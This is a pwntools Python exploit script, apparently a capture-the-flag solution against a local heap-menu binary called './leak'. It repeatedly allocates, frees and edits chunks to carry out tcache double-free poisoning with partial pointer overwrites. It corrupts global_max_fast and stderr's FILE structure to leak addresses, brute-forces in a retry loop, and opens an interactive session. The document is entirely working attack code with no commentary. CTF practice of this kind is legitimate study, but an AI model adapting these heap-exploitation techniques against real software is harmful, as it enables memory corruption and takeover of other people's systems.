from pwn import*
context(os='linux',arch='amd64',log_level='debug')

def add(index,size):
	s.sendlineafter(b'Your choice: ', b'1')
	s.sendlineafter(b'Index: ', str(index))
	s.sendlineafter(b'Size: ', str(size))

def edit(index,content):
	s.sendlineafter(b'Your choice: ', b'2')
	s.sendlineafter(b'Index: ', str(index))
	s.sendafter(b'Content: ', content)

def delete(index):
	s.sendlineafter(b'Your choice: ', b'3')
	s.sendlineafter(b'Index: ', str(index))

cnt = 1

while True:
	try:
		s = process('./leak')
		cnt += 1
		success('count:\t' + hex(cnt))
		add(0, 0x14b0)
		add(1, 0x410)
		add(2, 0x30)
		add(0xf, 0x14c0)
		delete(0xf)
		add(0xe, 0x10)

		delete(1)
		delete(2)
		edit(2, b'a'*0x10)
		delete(2)
		edit(2, b'a'*0x10)
		delete(2)
		edit(2, b'\x60\x77')
		edit(1, b'\x80\xe6')

		add(3, 0x410) # 3 = 1
		add(4, 0x30) # 4 = 3
		add(5, 0x30) # 5 = 1
		add(6, 0x30) # 6 stderr

		delete(1)
		delete(2)
		edit(2, b'a'*0x10)
		delete(2)
		edit(2, b'a'*0x10)
		delete(2)
		edit(2, b'\x60\x77')
		edit(1, b'\x40\xf9')

		add(7 ,0x410) # 7 = 1
		add(8, 0x30) # 8 = 3
		add(9, 0x30) # 9 = 1
		add(10, 0x30) # 10 global_max_fast

		add(0xd, 0x14c0)

		edit(10, b'\xff'*8)
		delete(0)
		delete(0xd)

		edit(6, p64(0xFBAD1800) + p64(0)*3 + b'\x50')


		edit(0xa, p64(0x80))
		delete(0xd)
		edit(0xf, p64(0)*3 + p64(0x233))


		#gdb.attach(s, 'b _IO_new_file_xsputn')
		#pause()

		add(11, 0x8880)
		#s.sendlineafter(b'Your choice: ', b'6')
		success('count:\t' + hex(cnt))
		s.interactive()
	except:
		s.close()
